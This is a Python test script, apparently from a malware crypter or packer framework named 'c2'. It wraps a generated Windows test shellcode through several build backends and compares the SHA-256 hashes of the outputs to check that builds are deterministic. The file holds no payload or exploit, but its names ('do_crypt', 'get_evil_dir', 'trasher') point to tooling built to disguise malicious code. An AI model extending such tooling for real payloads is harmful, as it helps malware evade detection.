import os, sys, argparse
import hashlib
from dataclasses import dataclass
from typing import List, Dict, Tuple
from pprint import pprint

from c2._internal_config import get_tmp_dir
from c2.backend import BackendFactory, BackendArgs
from c2.infra.unischema import unischema_load
from c2.test.fix_crp_opts_for_test import fix_crp_opts_for_test
from c2.test.p2gen_py import p2gen_gen_tbdemo
from c2.infra.tool_cli import ToolCLI
from c2.common.parse_scheme_address import parse_scheme_address


_sd = os.path.dirname(__file__)
_inclroot = f'{_sd}/..'
_tmp_dir = f'{get_tmp_dir()}/simple_seed_test'

class _ResultBook:
  def __init__(self):
    #self._rbtups: List[Tuple[Dict, Dict]]
    self._rbtitles = [] # [ 'cli://..', 'class://...', ]
    self._rbtups = [] # [ ({binpaths}, {outdata}), ({}, {}) ]

  def add_result(self, title, bin_paths, outdata):
    assert(type(bin_paths) == dict and type(outdata) == dict)
    self._rbtitles.append(title)
    self._rbtups.append( (bin_paths, outdata) )

  # check not all bin_paths from resultbook, but only configs|projects
  def check(self, configs, projects):
    hash_sets = []
    for i in range(len(self._rbtups)):
      bin_paths, outdata = self._rbtups[i]
      hashes = {}
      for config in bin_paths.keys():
        for project in bin_paths[config].keys():
          if not config in configs:
            print(f' [ ] skipping {config}|{project} (config not in configs)')
            continue
          if not project in projects:
            print(f' [ ] skipping {config}|{project} (project not in projects)')
            continue
          path = bin_paths[config][project]
          hash = hashlib.sha256(open(path, 'rb').read()).hexdigest()
          print(f' [+] SHA-256 HASH FOR {path} => {hash}')
          hashes.setdefault(config, {})[project] = hash
      hash_sets.append(hashes)
    self._report(hash_sets)

  def _report(self, hash_sets:List[Dict[str, Dict[str, bytes]]]):
    print('*** FINAL BINARY FILE HASHES ***')

    print('HASH sets for builds:')
    pprint(hash_sets)

    # just compare the hashes, compare [i] with [i+1]
    num_unexpected = 0
    for i in range(len(hash_sets)-1):
      if hash_sets[i] != hash_sets[i+1]:
        print(f'!!! {self._rbtitles[i]} hash#{i}  !=  {self._rbtitles[i]} hash#{i+1}  ({hash_sets[i]} != {hash_sets[i+1]})')
        num_unexpected += 1

    if num_unexpected:
      raise RuntimeError('hashes not eq, see log')



class SeedTest(ToolCLI):
  _default_backend_scheme_addresses = ['class://normal', 'cli://']
  _default_cfgs = 'Release,ReleaseSprayed'
  _default_prjs = 'virprog'

  def _notes(self):
    return ['We only maintain support for determinism for ReleaseSprayed, ' +
            'but as long as Release works too, we keep its test enabled. ' +
            'Thus, we\'ll get notified when it\'s broken.']
    
  def _initialize(self):
    self._progname = os.path.basename(__file__)

  def _setup_args(self):
    parser = self._parser
    self._agr.add_config('crpo', unischema_load(f'{_sd}/../crp_opts.UNISCHEMA', _inclroot))
    parser.add_argument('--do_cleanup', action='store_true')
    parser.add_argument('--backends', nargs='*', action='append', help=f'At least two; by default, {self._default_backend_scheme_addresses}')
    parser.add_argument('--configs_only', nargs='*', action='append')
    parser.add_argument('--projects_only', nargs='*', action='append')

  def _do_work(self):
    args = self._args
    agr = self._agr
    
    if not args.backends:
      backend_scheme_addresses = self._default_backend_scheme_addresses
    else:
      backend_scheme_addresses = sum(args.backends, [])
    if len(backend_scheme_addresses) < 2:
      raise RuntimeError(f'need at least TWO backends, got only {backend_scheme_addresses=}')
    print('We are going to create these backends:', backend_scheme_addresses)

    os.makedirs(_tmp_dir, exist_ok=True)
    tbdemo64_path = f'{_tmp_dir}/tbdemo64.bin'
    p2gen_gen_tbdemo('intel64', tbdemo64_path)
    print('tbdemo64 generated')

    prev_seeds = None
    resultbook = _ResultBook()
    backends = [] # we keep them in list to do_clear() later (if no exception occurred)
    
    crp_opts = agr.config('crpo') #########!!!!!!!!!!!!!!!! copy????????????????????????????????????????

    # We don't disable trasher. We need it cuz it has its seed in rnd_opts too.
    dont_disable_trasher = True
    if args.bla and 'bla:disabletrasher!' in args.bla:
      #
      #
      # When removing this code, probably change touchprj_dir to test (add to crp_opts::*), because
      # simple_seed_test (as other ct tests) should not depend on workdir data
      #
      #
      dont_disable_trasher = False
    fix_crp_opts_for_test(crp_opts, dont_disable_trasher=dont_disable_trasher)
    
    for scheme_addr in backend_scheme_addresses:

      print('---=== CRYPTING ON BACKEND', scheme_addr, '===---')

      backname, backinitstr = parse_scheme_address(scheme_addr)
      backend_fac = BackendFactory(backname, backinitstr)

      def_pay_info = unischema_load(f'{_sd}/../pay_info.UNISCHEMA', f'{_sd}/..').make_default_config()

      pay_info = {**def_pay_info, 'cpu':'intel64', 'bin_type': 'win_shellcode'}


      UNI_rnd_opts = unischema_load(f'{_sd}/../rnd_opts.UNISCHEMA', f'{_sd}/..')

      if prev_seeds != None:
        rnd_opts = {'seeds': prev_seeds}
      else:
        rnd_opts = UNI_rnd_opts.make_default_config() # empty seeds by default

      bld_opts = {
        'target_configs': ','.join(sum(args.configs_only, [])) if args.configs_only else self._default_cfgs,
        'target_projects': ','.join(sum(args.projects_only, [])) if args.projects_only else self._default_prjs
      }

      backargs = BackendArgs(tbdemo64_path, pay_info, crp_opts, rnd_opts, bld_opts)

      backend = backend_fac.create_backend(backargs)
      backends.append(backend)

      print(f'backend.do_init()...')
      backend.do_init()

      print(f'backend.do_crypt()... (dir: {backend.get_evil_dir()})')
      backend.do_crypt(f'{backend.get_evil_dir()}/cryptor.log')

      print(f'adding crypt to result book')
      bin_paths, outdata = backend.get_out_bin_paths(), backend.get_outdata()

      title = scheme_addr
      resultbook.add_result(title, bin_paths, outdata)
      prev_seeds = outdata['seeds']

      print(f'{bin_paths=}')
      print(f'{outdata=}')
      print()

    resultbook.check(bld_opts['target_configs'].split(','),
                     bld_opts['target_projects'].split(','))

    # clear directories ONLY if no exeptions (we got here if no exceptions)
    if args.do_cleanup:
      print('&&&&&&& CLEARING: calling ALL backends\' do_clear() &&&&&&&')
      for backend in backends:
        backend.do_clear()
    else:
      print('--do_cleanup not specified; no cleanup.')
    print('&&&&&&& CLEAR DONE! &&&&&&&')



if __name__ == '__main__':
  SeedTest(sys.argv[1:]).execute()









